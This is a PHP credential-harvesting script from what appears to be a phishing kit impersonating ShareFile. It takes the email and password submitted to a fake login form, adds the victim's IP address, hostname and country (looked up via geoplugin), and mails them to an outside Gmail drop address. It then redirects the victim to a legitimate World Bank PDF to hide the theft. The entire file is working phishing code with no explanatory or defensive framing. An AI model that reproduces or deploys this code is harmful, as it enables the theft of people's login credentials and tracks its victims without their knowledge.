<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$country = ip_visitor_country();
$message .= "|----------| CR33D |--------------|\n";
$message .= "Email: ".$_POST['S1']."\n";
$message .= "Pass: ".$_POST['S2']."\n";
$message .= "|--------------- I N F O -------------------|\n";
$message .= "|Client: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ---\n";
$message .= "|----------- CR33D --------------|\n";
$send = "boxoffice8636@gmail.com";
$subject = "$country | ShareFile";
{
mail("$send", "$subject", $message);   
}
?> 
<script type="text/javascript">
   window.top.location.href="http://www.doingbusiness.org/~/media/WBG/DoingBusiness/Documents/Annual-Reports/English/DB17-Full-Report.pdf";
</script>

<?php
// Function to get country;
function ip_visitor_country()
{

    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $country  = "Unknown";

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.geoplugin.net/json.gp?ip=".$ip);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $ip_data_in = curl_exec($ch); // string
    curl_close($ch);

    $ip_data = json_decode($ip_data_in,true);
    $ip_data = str_replace('&quot;', '"', $ip_data); // for PHP 5.2 see stackoverflow.com/questions/3110487/

    if($ip_data && $ip_data['geoplugin_countryName'] != null) {
        $country = $ip_data['geoplugin_countryName'];
		
		
    }

    return $country;
}

echo ip_visitor_country(); // output Country name


?>
